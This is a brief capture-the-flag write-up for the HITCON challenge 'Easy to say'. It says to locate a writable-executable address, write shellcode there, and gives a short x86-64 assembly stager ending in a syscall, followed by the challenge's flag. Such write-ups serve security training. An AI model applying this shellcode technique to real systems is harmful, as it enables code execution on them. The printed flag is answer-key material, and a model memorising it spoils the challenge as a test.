# Easy to say
## Misc 144
## 139 solved

* Get the `rwx` address, write shellcode on it.
```asm
mov dx, 0x1000
sub rsp, rdx
pop rbx
pop r15
pop rsi
syscall
```
* hitcon{sh3llc0d1n9_1s_4_b4by_ch4ll3n93_4u}